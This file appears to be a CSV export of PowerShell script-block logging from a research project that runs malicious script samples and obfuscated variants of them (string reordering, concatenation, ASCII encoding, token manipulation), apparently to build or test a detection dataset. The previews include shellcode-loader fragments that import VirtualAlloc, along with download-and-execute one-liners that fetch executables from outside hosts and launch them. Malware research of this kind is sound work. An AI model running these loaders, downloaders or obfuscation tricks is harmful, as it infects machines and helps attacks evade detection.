"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:19:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:55 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1590.ps1","2828"," ((""{9}{40}{39}{29}{36}{5}{44}{25}{4}{34}{15}{37}{6}{12}{46}{11}{1}{8}{43}{20}{41}{31}{10}{19}{24}{14}{13}{21}{2}{7}{16}{33}{30}{35}{18}{0}{26}{38}{27}{3}{45}{28}{17}{32}{42}{22}{23}"" -f'5f,0x5a,0x8b,"
"8/6/2026 10:19:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:47 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1590.ps1","2627","& ( $eNv:coMsPEC[4,15,25]-jOin'')(('AWEc = '+'3hH[Dl'+'lImport(sw1k'+'ernel32.dllsw1)]public '+'static extern In'+'tPtr VirtualAllo'+'c(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro"
"8/6/2026 10:19:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:39 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1590.ps1","23","{ ( [Int]$_-AS [cHar])}"
"8/6/2026 10:19:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1590.ps1","9823",".( $sHeLLId[1]+$sheLlid[13]+'X') ([StrIng]::jOIN('' , ((36,99 ,32,61,32,39, 91, 68 ,108, 108 ,73, 109,112 ,111,114,116 ,40, 34, 107,101 ,114, 110 , 101 ,108,51 , 50, 46, 100 , 108, 108, 34 , 41 , 93, "
"8/6/2026 10:19:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:31 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1590.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1588.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:15 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1588.ps1","2802"," ((""{32}{29}{2}{15}{35}{45}{9}{1}{28}{0}{24}{18}{41}{44}{37}{3}{10}{21}{27}{20}{46}{40}{30}{14}{16}{5}{42}{22}{19}{23}{43}{12}{6}{8}{4}{7}{13}{17}{11}{36}{34}{33}{25}{26}{31}{39}{38}"" -f 'emberDefinit"
"8/6/2026 10:19:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:06 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1588.ps1","2651","InVoke-eXpRESSiON( (('apMc = LT3[DllImport(NeHkernel32.dllNeH)]public static extern IntPtr Vir'+'tualAlloc(IntPtr lpAddress, uint dwSize'+', uint flAlloca'+'tionType, uint flProtect);[Dll'+'Import(NeH"
"8/6/2026 10:18:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:58 AM","","2233"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:18:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1588.ps1","9851"," & ( $EnV:comSpeC[4,26,25]-join'')("" $( set-ITEM  'VaRIable:OfS'  '')""+ [StrinG][ChaR[]](36, 99,32 ,61,32,39,91,68 ,108, 108, 73 , 109 ,112,111 ,114, 116 , 40, 34 ,107 , 101 , 114, 110 ,101,108,51 ,50"
"8/6/2026 10:18:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:50 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1588.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:18:43 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1585.ps1","127","(N`e`W-`objeCt System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');ST`A`RT-pR`oce`ss 'mess.exe'
"
"8/6/2026 10:18:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:35 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1585.ps1","410"," (((""{10}{25}{8}{3}{23}{15}{7}{17}{20}{6}{4}{1}{22}{24}{14}{11}{5}{12}{13}{16}{9}{18}{2}{19}{21}{0}"" -f'rocess HKtmess.exeHKt','tps://1','K','Net','oadFile(HKtht','yf','wnl','Cli','stem.','.ex','(New-"
"8/6/2026 10:18:27 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:27 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:27 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:27 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:27 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1585.ps1","257",". ( $SHeLlid[1]+$shELliD[13]+'X') ((('(New-Object Sys'+'te'+'m.Net'+'.'+'Web'+'Client)'+'.Downlo'+'ad'+'Fi'+'le({0}ht'+'tps:'+'//'+'1fichier.com/?'+'hfshj'+'hm0yf{'+'0'+'},{0}mes'+'s.e'+'xe'+'{0});S'+"
"8/6/2026 10:18:19 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:19 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:19 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:19 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:19 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1585.ps1","18","{([cHAr][inT] $_)}"
"8/6/2026 10:18:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1585.ps1","519"," ( '40@78G101&119i45U79-98S106&101@99U116i32-83%121U115S116<101&109&46@78i101&116&46i87-101@98S67%108@105<101%110@116G41-46G68i111-119@110@108S111%97U100<70U105-108&101i40%39S104S116d116@112%115G58G47"
"8/6/2026 10:18:11 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:11 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:11 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:11 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:11 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1585.ps1","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:03 AM","","9","$global:?"
"8/6/2026 10:18:03 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:03 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:03 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:03 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1579.ps1","148","(new`-OBJ`EcT System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");S`T`Art-Pro`cesS (""$env:TEMP\Pa_001.exe"")
"
"8/6/2026 10:17:56 AM","","9","$global:?"
"8/6/2026 10:17:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:55 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1579.ps1","543",".((GET-vaRIaBLE '*mDr*').nAmE[3,11,2]-joIn'') ((((""{16}{0}{32}{9}{10}{4}{24}{31}{21}{38}{2}{30}{26}{15}{23}{35}{28}{40}{14}{19}{17}{18}{3}{5}{36}{34}{27}{1}{25}{20}{6}{22}{13}{41}{29}{11}{8}{37}{12}{3"
"8/6/2026 10:17:48 AM","","9","$global:?"
"8/6/2026 10:17:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:48 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1579.ps1","465","Iex((('(Ne'+'w-'+'Ob'+'je'+'ct S'+'yst'+'em.Net.WebCli'+'ent)'+'.Do'+'wnlo'+'a'+'dF'+'ile(BZKhttp://nikil.tk'+'/p1'+'/P'+'a_'+'0'+'01'+'.exeBZK,mq'+'bws9en'+'v'+':TEM'+'PwZx'+'Pa_001.ex'+'emqb);Start-"
"8/6/2026 10:17:40 AM","","9","$global:?"
"8/6/2026 10:17:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:40 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1579.ps1","24","{( [iNt]$_ -aS [chAr]) }"
"8/6/2026 10:17:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1579.ps1","593","[STRiNG]::jOin('',('40e78;101e119A45z79e98,106Q101<99b116,32&83;121e115e116e101b109b46Q78&101<116Q46&87Q101,98b67<108;105<101,110e116b41A46&68z111!119&110e108e111z97;100z70,105z108Q101&40,39&104b116A1"
"8/6/2026 10:17:32 AM","","9","$global:?"
"8/6/2026 10:17:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1579.ps1","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1532.ps1","2326","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:16 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1532.ps1","2886","(((""{26}{29}{31}{13}{19}{18}{11}{47}{7}{38}{37}{40}{44}{20}{0}{1}{24}{6}{21}{2}{33}{4}{8}{48}{12}{41}{16}{34}{27}{25}{46}{42}{14}{10}{5}{32}{23}{45}{43}{39}{17}{30}{28}{3}{15}{35}{9}{22}{36}""-f'p','e "
"8/6/2026 10:17:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:08 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1532.ps1","2761","('Acnc = NBq[DllImport(42Wkernel32.dll42'+'W)]public static extern IntPtr'+' VirtualAlloc(IntPtr lpAddress, uint d'+'wSize, uint flAllocationType, u'+'int flProte'+'ct);[DllImport(42Wkernel32.dll42W)]"
"8/6/2026 10:17:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:00 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1532.ps1","24","{( [INt] $_ -As [cHAr])}"
"8/6/2026 10:17:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1532.ps1","10189","-JOiN ( ( 36 , 99,32, 61 , 32, 39 , 91,68 ,108 ,108,73, 109 , 112,111 , 114 ,116 , 40,34 ,107,101,114 ,110 , 101 , 108, 51, 50 , 46,100 ,108, 108 , 34, 41, 93 , 112,117, 98 ,108, 105,99 , 32, 115 ,116"
"8/6/2026 10:16:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1532.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1530.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1530.ps1","2812","((""{19}{33}{0}{3}{5}{30}{4}{25}{10}{26}{15}{40}{31}{23}{41}{22}{14}{46}{45}{8}{28}{6}{35}{36}{2}{43}{13}{39}{11}{34}{38}{7}{12}{42}{24}{32}{9}{20}{21}{16}{27}{44}{17}{1}{29}{18}{37}"" -f'e',');qm8i++) "
"8/6/2026 10:16:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:28 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
